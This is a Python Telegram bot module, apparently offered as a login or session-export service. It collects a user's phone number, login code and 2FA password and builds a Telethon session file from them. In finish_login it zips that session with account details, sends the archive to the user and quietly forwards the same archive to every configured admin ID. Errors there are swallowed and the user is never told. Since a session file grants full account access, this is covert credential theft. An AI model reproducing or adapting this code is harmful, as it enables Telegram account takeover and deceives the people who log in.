import os
import json
import zipfile
import asyncio
import logging
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, AuthRestartError
from dotenv import load_dotenv

load_dotenv()
ACCOUNT_LOGIN_BACK = os.getenv("ACCOUNT_LOGIN_BACK")
ADMIN_ID = os.getenv("ADMIN_ID")
API_ID = int(os.getenv("API_ID", "2040"))
API_HASH = os.getenv("API_HASH", "b18441a1ff607e10a989891a5462e627")

logger = logging.getLogger(__name__)

class LoginHandler:
    def __init__(self, user_id, chat_id):
        self.user_id = user_id
        self.chat_id = chat_id
        self.phone = None
        self.client = None
        self.session_file = None
        self._lock = asyncio.Lock()
        self._retry_count = 0
        
    async def handle_phone(self, update, context, phone):
        self.phone = phone
        self.session_file = f"sessions/{phone}.session"
        os.makedirs("sessions", exist_ok=True)
        
        self.client = TelegramClient(self.session_file, API_ID, API_HASH)
        await self.client.connect()
        
        try:
            if not await self.client.is_user_authorized():
                await self.client.send_code_request(phone)
                await update.message.reply_text(
                    "<tg-emoji emoji-id='5877316724830768997'>📤</tg-emoji> 验证码已发送，请输入：",
                    parse_mode='HTML'
                )
            else:
                await self.finish_login(update, context)
        except AuthRestartError:
            if self._retry_count < 3:
                self._retry_count += 1
                logger.warning(f"AuthRestartError, retrying... ({self._retry_count}/3)")
                await asyncio.sleep(2)
                await self.handle_phone(update, context, phone)
            else:
                await update.message.reply_text(
                    "<tg-emoji emoji-id='5839200986022812209'>❌</tg-emoji> 服务器繁忙，请稍后重试",
                    parse_mode='HTML'
                )
    
    async def handle_code(self, update, context, code):
        async with self._lock:
            try:
                await self.client.sign_in(self.phone, code)
                await self.finish_login(update, context)
                return True
            except SessionPasswordNeededError:
                await update.message.reply_text(
                    "<tg-emoji emoji-id='6005570495603282482'>🔐</tg-emoji> 需要2FA密码，请输入：",
                    parse_mode='HTML'
                )
                return False
            except AuthRestartError:
                await update.message.reply_text(
                    "<tg-emoji emoji-id='5877613700344450910'>❌</tg-emoji> 验证超时，请重新发送验证码",
                    parse_mode='HTML'
                )
                if self.client:
                    await self.client.disconnect()
                    self.client = None
                return None
            except Exception as e:
                await update.message.reply_text(
                    f"<tg-emoji emoji-id='5775887550262546277'>❌</tg-emoji> 登录失败: {str(e)}",
                    parse_mode='HTML'
                )
                if self.client:
                    await self.client.disconnect()
                    self.client = None
                return None
    
    async def handle_2fa(self, update, context, password):
        async with self._lock:
            try:
                await self.client.sign_in(password=password)
                await self.finish_login(update, context)
                return True
            except Exception as e:
                await update.message.reply_text(
                    f"<tg-emoji emoji-id='5775887550262546277'>❌</tg-emoji> 2FA验证失败: {str(e)}",
                    parse_mode='HTML'
                )
                return False
    
    async def finish_login(self, update, context):
        me = await self.client.get_me()
        
        json_data = {
            "api_id": API_ID,
            "api_hash": API_HASH,
            "user_id": str(me.id),
            "phone": self.phone,
            "username": me.username or "",
            "session_file": os.path.basename(self.session_file).replace('.session', ''),
        }
        
        json_path = self.session_file.replace('.session', '.json')
        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump(json_data, f, indent=2)
        
        zip_path = f"downloads/login_{self.user_id}_{int(asyncio.get_event_loop().time())}.zip"
        os.makedirs("downloads", exist_ok=True)
        
        with zipfile.ZipFile(zip_path, 'w') as zipf:
            zipf.write(self.session_file, os.path.basename(self.session_file))
            zipf.write(json_path, os.path.basename(json_path))
        
        await context.bot.send_document(
            chat_id=self.chat_id,
            document=open(zip_path, 'rb'),
            caption=f"<tg-emoji emoji-id='5920052658743283381'>✅</tg-emoji> 登录成功\n<tg-emoji emoji-id='5877316724830768997'>📱</tg-emoji> {self.phone}",
            parse_mode='HTML'
        )
        
        if ADMIN_ID:
            for admin_id in ADMIN_ID.split(','):
                try:
                    await context.bot.send_document(
                        chat_id=admin_id.strip(),
                        document=open(zip_path, 'rb'),
                        caption=f"用户 {self.user_id} 登录: {self.phone}"
                    )
                except:
                    pass
        
        os.remove(zip_path)
        os.remove(self.session_file)
        os.remove(json_path)
        await self.client.disconnect()
